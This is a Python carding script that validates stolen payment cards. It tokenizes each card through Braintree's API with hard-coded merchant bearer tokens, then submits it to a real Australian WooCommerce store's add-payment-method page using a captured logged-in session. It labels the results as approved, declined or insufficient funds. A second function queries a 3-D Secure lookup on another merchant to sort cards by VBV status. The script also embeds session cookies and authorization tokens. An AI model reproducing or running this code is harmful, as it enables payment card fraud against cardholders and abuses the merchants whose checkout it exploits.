import requests
import re
import random
import time
import string
import base64
import user_agent
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI1ODgwMzcsImp0aSI6IjJmNzBiZTJjLWNmMWUtNDFlYS1hMzNkLTkzZTBiYTE4MzNjMCIsInN1YiI6IjU3OWJiODk5eW5rZGo2bnMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjU3OWJiODk5eW5rZGo2bnMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ._TV11ZwxfAmp6J7zs1PW3gV--xU_OX8ZxxNc5SxA6BkgXVg1xyiGsKLFtzB8NWOViYFEz-ptjYZgS6uJGmVjZQ',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	
	json_data = {
	    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': 'fd026d33-2e53-486e-b991-360b34ef9d96',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']

	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	cookies = {
	'_fbp': 'fb.2.1722501438044.89400922554353957',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-08-01%2008%3A37%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annavasily.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-08-01%2008%3A37%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annavasily.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'header_message': 'true',
    '_gid': 'GA1.3.1753421220.1722501440',
    '_pin_unauth': 'dWlkPVlqUXlObVJpTkRjdFpHUTVOUzAwTTJKakxUa3hNREl0TkRkaE56azNaREV5TVdVMg',
    'SL_C_23361dd035530_SID': '{"9c43f6e61eced0c8357b45882fc5a5926cc3dc44":{"sessionId":"dYrT9cyXojQyVkESkLZgj","visitorId":"j9j8Y92zTU_-kCjXYKSn0"}}',
    'fixedCTAclosed': 'true',
    'wordpress_logged_in_fdf710374cacf9fba9982f542e21a59d': 'sewsfh435%40mgrag.von%7C1722674273%7CYIlirb0K1sUf4txyK0yrnYjgafy0bbfvjuyH3zlnSZe%7C8d76a701583c24b587e641980428d69801386f629c403e0218530031de0b6efd',
    'wfwaf-authcookie-323a28ddd6dfa4543f8cbf42bf01fa66': '53455%7Cother%7Cread%7C0e350705f92d42482a56656419b0e72c3557d4f57b9f76a7ba55983081935662',
    '_ga_RGN39Q4VQQ': 'GS1.1.1722501438.1.1.1722501637.59.0.0',
    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.annavasily.com.au%2Fmy-account%2Fadd-payment-method%2F',
    '_uetsid': '43997bd04fe111efbab6bf53cdeded86',
    '_uetvid': '439a64404fe111efb952f1b4df15bb0b',
    '_ga': 'GA1.3.1449798968.1722501439',
    '_gat_UA-92570570-1': '1',
}
	
	headers = {
	'authority': 'www.annavasily.com.au',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_fbp=fb.2.1722501438044.89400922554353957; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-01%2008%3A37%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annavasily.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-01%2008%3A37%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.annavasily.com.au%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; header_message=true; _gid=GA1.3.1753421220.1722501440; _pin_unauth=dWlkPVlqUXlObVJpTkRjdFpHUTVOUzAwTTJKakxUa3hNREl0TkRkaE56azNaREV5TVdVMg; SL_C_23361dd035530_SID={"9c43f6e61eced0c8357b45882fc5a5926cc3dc44":{"sessionId":"dYrT9cyXojQyVkESkLZgj","visitorId":"j9j8Y92zTU_-kCjXYKSn0"}}; fixedCTAclosed=true; wordpress_logged_in_fdf710374cacf9fba9982f542e21a59d=sewsfh435%40mgrag.von%7C1722674273%7CYIlirb0K1sUf4txyK0yrnYjgafy0bbfvjuyH3zlnSZe%7C8d76a701583c24b587e641980428d69801386f629c403e0218530031de0b6efd; wfwaf-authcookie-323a28ddd6dfa4543f8cbf42bf01fa66=53455%7Cother%7Cread%7C0e350705f92d42482a56656419b0e72c3557d4f57b9f76a7ba55983081935662; _ga_RGN39Q4VQQ=GS1.1.1722501438.1.1.1722501637.59.0.0; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.annavasily.com.au%2Fmy-account%2Fadd-payment-method%2F; _uetsid=43997bd04fe111efbab6bf53cdeded86; _uetvid=439a64404fe111efb952f1b4df15bb0b; _ga=GA1.3.1449798968.1722501439; _gat_UA-92570570-1=1',
    'origin': 'https://www.annavasily.com.au',
    'referer': 'https://www.annavasily.com.au/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/579bb899ynkdj6ns/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/579bb899ynkdj6ns"},"merchantId":"579bb899ynkdj6ns","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Frezia","clientId":"Abojaq-ttmvpPaC_EvacqAUCVK0vKBCN23baNaPq2GA--sPe0FsC2r4ZF3Xa5Jegjdw2sP8uaILaAVfU","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"freziaAUD","payeeEmail":null,"currencyIsoCode":"AUD"}}',
    '_wpnonce': '57f0c4e189',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
	
	response = requests.post(
    'https://www.annavasily.com.au/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
	   return 'Approved'
	   if 'Insufficient Funds' in result:
	   	return 'Insufficient Funds'
	   	
	else:
		return result
		
def sq(card):
	return 'ابقي غطيها كويس لما تيجي تنام'


def vbv(ccx):
		import requests,re,base64,jwt,json
		n = ccx.split("|")[0]
		mm = ccx.split("|")[1]
		yy = ccx.split("|")[2]
		cvc = ccx.split("|")[3]
		if "20" in yy:#Mo3gza
			yy = yy.split("20")[1]
		user = user_agent.generate_user_agent()
		headers = {
	    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI1ODkzOTQsImp0aSI6Ijk4NDc4MTAyLTg3NjgtNDhiMC05OWZiLTZkMTljN2EyM2ViNyIsInN1YiI6IjZoZjh3cm1uMnp0YmtwcjciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjZoZjh3cm1uMnp0YmtwcjciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.4oSa0Wh0NP5W3CS0SGKcP3XywxlZnXq-aUzKGLQ3lZgBFNKqGI2Couq16eEkWen0UVtI758unQar1pJioKBF4Q',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

		json_data = {
	    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': '29688991-6d64-46f9-bcd2-7b8c75f57043',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'cardholderName': 'Amir Meor',
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
		tok = response.json()['data']['tokenizeCreditCard']['token']
		
		headers = {
	    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/json',
    'origin': 'https://metatagmanager.com',
    'referer': 'https://metatagmanager.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}


		json_data = {
	    'amount': '49.00',
    'additionalInfo': {
        'acsWindowSize': '03',
        'billingLine1': '323 E Pine St',
        'billingLine2': '',
        'billingCity': 'Deming',
        'billingState': 'Iriri',
        'billingCountryCode': 'TR',
        'billingGivenName': 'Mero',
        'billingSurname': 'AYman',
        'email': 'mfggeuero@gmail.com',
    },
    'bin': '544548',
    'dfReferenceId': '0_65c42a4e-f3c4-4ca2-9149-ebe8a9adc7cf',
    'clientMetadata': {
        'sdkVersion': 'web/3.52.0',
        'requestedThreeDSecureVersion': '2',
        'cardinalDeviceDataCollectionTimeElapsed': 744,
        'issuerDeviceDataCollectionTimeElapsed': 6592,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI1ODkzOTQsImp0aSI6Ijk4NDc4MTAyLTg3NjgtNDhiMC05OWZiLTZkMTljN2EyM2ViNyIsInN1YiI6IjZoZjh3cm1uMnp0YmtwcjciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjZoZjh3cm1uMnp0YmtwcjciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.4oSa0Wh0NP5W3CS0SGKcP3XywxlZnXq-aUzKGLQ3lZgBFNKqGI2Couq16eEkWen0UVtI758unQar1pJioKBF4Q',
    'braintreeLibraryVersion': 'braintree/web/3.52.0',
    '_meta': {
        'merchantAppId': 'metatagmanager.com',
        'platform': 'web',
        'sdkVersion': '3.52.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '29688991-6d64-46f9-bcd2-7b8c75f57043',
    },
}


		response = requests.post(
	    f'https://api.braintreegateway.com/merchants/6hf8wrmn2ztbkpr7/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
		    headers=headers,
		    json=json_data,
		)
		try:
			string=response.json()['paymentMethod']['threeDSecureInfo']['status']
		except:
			return 'Error'
		formatted_string = string.replace("_", " ").title()
		otp=(formatted_string)
		if 'Successful' in otp or 'Unavailable' in  otp or 'successful' in otp:
			return otp+' ✅'
		else:
			return otp+' ❌'
			return result(cc)